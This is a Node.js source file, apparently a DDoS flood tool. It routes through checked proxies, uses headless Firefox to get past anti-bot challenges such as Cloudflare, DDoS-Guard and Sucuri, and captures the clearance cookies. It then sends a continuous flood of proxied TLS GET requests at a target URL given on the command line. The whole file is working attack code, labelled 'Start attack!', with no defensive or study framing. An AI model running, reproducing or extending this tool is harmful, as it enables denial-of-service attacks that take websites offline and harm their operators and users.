const playwright = require('playwright');
const url = require('url');
const {constants} = require('crypto');
const cluster = require("cluster");
var http = require('http')
var tls = require('tls');
const fs = require('fs');
const proxyChecker = require("proxy-checker");
const http2 = require("http2");

process.on('uncaughtException', function (er) {
    console.error(er)
});
process.on('unhandledRejection', function (er) {
    console.error(er)
});
require("events").EventEmitter.defaultMaxListeners = 0;
var validProxies = [];
shuffleFileLines();
function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
  }

function shuffleFileLines() {
    const filename = 'browserProxy.txt';
    fs.readFile(filename, 'utf8', function(err, data) {
      if (err) throw err;
      
      // Разбиваем содержимое файла на массив строк
      const lines = data.split('\n');
    
      // Перемешиваем массив строк в случайном порядке
      const shuffled = shuffleArray(lines);
    
      // Сохраняем перемешанные строки в новый файл
      const shuffledFilename = 'shuffled.txt';
      fs.writeFileSync(shuffledFilename, shuffled.join('\n'));
    
      console.log(`Содержимое файла '${filename}' было перемешано и сохранено в файл '${shuffledFilename}'.`);
    });
    
}  
function check_proxy() {
    proxyChecker.checkProxiesFromFile(
        // The path to the file containing proxies
        'shuffled.txt',
        {
            // the complete URL to check the proxy
            url: "https://www.google.com",
            // an optional regex to check for the presence of some text on the page
        },
        // Callback function to be called after the check
        function(host, port, ok, statusCode, err) {
            if (ok === true && validProxies.length < 30) {
                // выполняется, если ok равно true
                //console.log(host + ':' + port + ' => '+ ok + ' (status: ' + statusCode + ', err: ' + err + ')');
                validProxies.push(host + ':' + port)
            }
        }
    );
}

const popularDirectories = [
    "/about",
    "/account",
    "/admin",
    "/api",
    "/archive",
    "/assets",
    "/audio",
    "/auth",
    "/blog",
    "/books",
    "/calendar",
    "/cart",
    "/categories",
    "/chat",
    "/checkout",
    "/clients",
    "/comments",
    "/community",
    "/config",
    "/contact",
    "/contributor",
    "/css",
    "/dashboard",
    "/data",
    "/demo",
    "/design",
    "/developer",
    "/directory",
    "/docs",
    "/downloads",
    "/editor",
    "/education",
    "/email",
    "/error",
    "/events",
    "/examples",
    "/faq",
    "/feedback",
    "/files",
    "/fonts",
    "/forum",
    "/galleries",
    "/games",
    "/help",
    "/history",
    "/home",
    "/images",
    "/inbox",
    "/index",
    "/info",
    "/install",
    "/integration",
    "/invoices",
    "/js",
    "/knowledgebase",
    "/language",
    "/legal",
    "/library",
    "/license",
    "/login",
    "/logout",
    "/media",
    "/members",
    "/messages",
    "/music",
    "/my",
    "/news",
    "/newsletter",
    "/partners",
    "/photos",
    "/plugins",
    "/portfolio",
    "/pricing",
    "/privacy",
    "/profile",
    "/projects",
    "/public",
    "/register",
    "/releases",
    "/reports",
    "/resources",
    "/search",
    "/security",
    "/settings",
    "/shop",
    "/sitemap",
    "/src",
    "/stats",
    "/store",
    "/style",
    "/support",
    "/tags",
    "/team",
    "/templates",
    "/test",
    "/themes",
    "/tools",
    "/tutorials",
    "/upload",
    "/user",
    "/videos",
    "/webinars",
    "/wiki",
    "/wp-content"
  ];
var target_url = process.argv[2];
var delay = process.argv[3];
 const parsed = url.parse(target_url);
var threads = process.argv[4];
//var proxys = ["111.111.111.111"]

if (cluster.isMaster) {
    for (var i = 0; i < threads; i++) {
        cluster.fork();
        console.log(`${i + 1} Thread Started`);
    }
    setTimeout(() => {
        process.exit(1);
    }, delay * 1000);
} else {
   
    check_proxy();
    
    setTimeout(() => {
        console.log('Start browser!');
        console.log(validProxies)
        return  solverInstance({
            "Target": target_url,
            "Time": delay,
            "Rate": 10000,
            "Proxy": getRandomElement(validProxies)});
    }, 15000);
   

}


function getRandomElement(array) {
    var randomIndex = Math.floor(Math.random() * array.length);
    return array[randomIndex];
}

const JSList = {
    "js": [{
        "name": "CloudFlare",
        "navigations": 2,
        "locate": "<title>Just a moment...</title>"
    },{
        "name": "CloudFlare (Secure JS)",
        "navigations": 2,
        "locate": "<h2 class=\"h2\" id=\"challenge-running\">"
    }, {
        "name": "CloudFlare (Normal JS)",
        "navigations": 2,
        "locate": "<div class=\"cf-browser-verification cf-im-under-attack\">"
    }, {
        "name": "BlazingFast v1.0",
        "navigations": 1,
        "locate": "<br>DDoS Protection by</font> Blazingfast.io</a>"
    }, {
        "name": "BlazingFast v2.0",
        "navigations": 1,
        "locate": "Verifying your browser, please wait...<br>DDoS Protection by</font> Blazingfast.io</a></h1>"
    }, {
        "name": "Sucuri",
        "navigations": 4,
        "locate": "<html><title>You are being redirected...</title>"
    }, {
        "name": "StackPath",
        "navigations": 4,
        "locate": "<title>Site verification</title>"
    }, {
        "name": "StackPath EnforcedJS",
        "navigations": 4,
        "locate": "<title>StackPath</title>"
    }, {
        "name": "React",
        "navigations": 1,
        "locate": "Check your browser..."
    }, {
        "name": "DDoS-Guard",
        "navigations": 1,
        "locate": "DDoS protection by DDos-Guard"
    }, {
        "name": "VShield",
        "navigations": 1,
        "locate": "fw.vshield.pro/v2/bot-detector.js"
    }, {
        "name": "GameSense",
        "navigations": 1,
        "locate": "<title>GameSense</title>"
    }, {
        "name": "PoW Shield",
        "navigations": 1,
        "locate": "<title>PoW Shield</title>"
    }]
}


function cookiesToStr(cookies) {
    if (Array.isArray(cookies)) {
        return cookies.reduce((prev, {
            name, value
        }) => {
            if (!prev) return `${name}=${value}`;
            return `${prev}; ${name}=${value}`;
        }, "");
    }
}


function JSDetection(argument) {
    for (let i = 0; i < JSList['js'].length; i++) {
        if (argument.includes(JSList['js'][i].locate)) {
            return JSList['js'][i]
        }
    }
}

function randomIntFromInterval(min,max)
{
    return Math.floor( Math.random()*  ( max - min + 1 ) + min );
}
function solverInstance(args) {
    return new Promise((resolve, reject) => {
        playwright.firefox.launch({
            headless: true,
            proxy: {
                server: 'http://' + args.Proxy
            },
        }).then(async (browser) => {

            const page = await browser.newPage();

            try {
                await page.goto(args.Target,{timeout : 15000});     
            } catch (e) {
                console.log('Next Solver')
                await browser.close();
                reject(e);
                solverInstance({
                    "Target": target_url,
                    "Time": delay,
                    "Rate": 10000,
                    "Proxy": getRandomElement(validProxies)});
                
            }

            const ua = await page.evaluate(() => navigator.userAgent);
            console.log(`UA: ${ua}`);

            for (let detect = 0; detect < 5; detect++) {

                var source = await page.content();
                var title = await page.title()
                //console.log(source);
                var JS = await JSDetection(source);
                if (title === "Access denied") {
                    console.log(`Proxy Banned!!!`);
                }
                if (JS) {
                    console.log(`Detect ${JS.name}`);
                    if (JS.name === "VShield") {
                        await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
                        await page.mouse.down();
                        await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
                        await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
                        await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
                        await page.mouse.move(randomIntFromInterval(100), randomIntFromInterval(100));
                        await page.mouse.up();
                    }

                    for (let i = 0; i < JS.navigations; i++) {
                            var [response] = await Promise.all([page.waitForNavigation()])
                        console.log(`Await redirect ${i + 1}`); 
                    }
                }
            }
            const cookies = cookiesToStr(await page.context().cookies());
            console.log(`${cookies}`);
            resolve(cookies);
            await browser.close();
          startflood(args, ua, cookies)
           
        })
    })
}
   const keepAliveAgent = new http.Agent({
        keepAlive: true,
        keepAliveMsecs: 50000,
        maxSockets: Infinity
    });
let headers1 = {}
function startflood(args,ua,cookies) {
    const sigalgs = ['ecdsa_secp256r1_sha256', 'ecdsa_secp384r1_sha384', 'ecdsa_secp521r1_sha512', 'rsa_pss_rsae_sha256', 'rsa_pss_rsae_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'];
const cplist = ["ECDHE-ECDSA-AES128-GCM-SHA256", 
"ECDHE-ECDSA-CHACHA20-POLY1305",
 "ECDHE-RSA-AES128-GCM-SHA256",
 "ECDHE-RSA-CHACHA20-POLY1305",
  "ECDHE-ECDSA-AES256-GCM-SHA384",
  "ECDHE-RSA-AES256-GCM-SHA384",
 "ECDHE-ECDSA-AES128-SHA256", 
 "ECDHE-RSA-AES128-SHA256", 
 "ECDHE-ECDSA-AES256-SHA384",
  "ECDHE-RSA-AES256-SHA384"];
  const SignalsList = sigalgs.join(':');
const chipers = cplist.join(':')
    console.log('Start attack!');
     setInterval(() => {
        var req = http.request({
            host: args.Proxy.split(':')[0],
            port: args.Proxy.split(':')[1],
            method: 'CONNECT',
            path: parsed.host + ":443",
            agent : keepAliveAgent
        });
  
        req.on('connect', function (res, socket, head) { 
            socket.setTimeout(5000, () => {
                socket.destroy();
            });

            var tlsConnection = tls.connect({
                host: parsed.host,
                servername: parsed.host,
                ciphers: chipers,
                secureProtocol: ['TLSv1_1_method','TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2'],
                secure: true,
                requestCert: true,
                gzip: true,
                followAllRedirects: true,
                decodeEmails: false,
                sigalgs: SignalsList,
                honorCipherOrder: true,
                secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_RENEGOTIATION | constants.SSL_OP_NO_TICKET | constants.SSL_OP_NO_SSLv2 | constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_COMPRESSION | constants.SSL_OP_NO_RENEGOTIATION | constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | constants.SSL_OP_TLSEXT_PADDING | constants.SSL_OP_ALL ,
                rejectUnauthorized: false,
                socket: socket,
                
            }, function () {
                tlsConnection.setKeepAlive(true,50000)
                for (let index = 0; index < 256; index++) {
                    tlsConnection.write("GET "+parsed.pathname+"  HTTP/1.1\r\nHost: "+parsed.host+"\r\nUser-Agent: "+ua+"\r\nCookie:"+cookies+"\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nTE: trailers\r\n\r\n")
                }
            });
            tlsConnection.setEncoding('utf8');
            tlsConnection.on('response', function (data) {
                tlsConnection.end();
            });
            tlsConnection.on('data', function (data) {
                //console.log(data);
            });
            tlsConnection.on('error', function (data) {
                tlsConnection.end();
            });
        });
        req.end();
    },1);
}



